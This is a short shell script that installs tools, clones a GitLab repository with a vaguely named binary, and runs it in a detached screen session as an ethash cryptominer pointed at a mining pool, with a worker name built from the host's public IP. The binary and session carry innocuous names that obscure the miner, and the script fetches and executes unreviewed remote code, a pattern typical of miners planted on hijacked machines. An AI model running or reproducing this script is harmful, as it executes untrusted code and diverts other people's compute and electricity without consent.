#!/bin/sh
apt-get update
apt-get install zip unzip
apt-get install screen -y
screen -dmS er.sh 65 75
git clone https://gitlab.com/letricejuliocesar/goodday
cd goodday
chmod +x x
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  ./x -a ethash -w berkah.001 -p stratum+tcp://ethash.kupool.com:443 -r $ip --nvidia 1
